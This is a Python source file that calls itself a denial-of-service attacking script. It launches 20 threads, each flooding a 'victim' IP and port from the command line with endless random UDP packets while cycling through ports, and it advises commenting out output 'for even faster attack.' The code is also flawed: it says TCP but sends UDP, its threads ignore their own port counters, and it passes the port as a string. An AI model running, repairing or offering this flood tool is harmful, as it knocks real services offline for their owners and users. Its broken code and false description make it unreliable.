from socket import socket, AF_INET, SOCK_DGRAM
from random import _urandom as rand_byte
from threading import Thread
from sys import argv

MAX_PORT = 65534


class MyThread(Thread):
    def __init__(self, ip_address, port):
        Thread.__init__(self)
        self._ip_address = ip_address
        self._port = port
        self._sent = 0
        self._sock = socket(AF_INET, SOCK_DGRAM)
        self._packet = rand_byte(1024)  # create a packet
        self._change_ports = True

    def run(self):
        while True:
            self._sock.sendto(self._packet, (ip, port))
            # print("{ip_address}:{port} ({no_of_packets} packets sent so far)".format(
            #     ip_address = self._ip_address,
            #     port = self._port,
            #     no_of_packets = self._sent
            # ))

            # comment the above print statement for even faster attack

            self._sent += 1

            if self._change_ports:
                self._port += 1
                if self._port == MAX_PORT:
                    self._port = 1  # MAX_PORT reached, starting from port 1 again


# victim information
if(len(argv) > 2):
    ip = argv[1]
    port = argv[2]

    change_ports = True

    print("Welcome to DOS attacking script.\nDeveloped by : Tibebeselasie Mehari\nWorks by continually sending TCP packets to the victim.")

    threads = [MyThread(ip, port) for _ in range(20)]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
else:
    print("Usage : read the README.md file on how to use it")
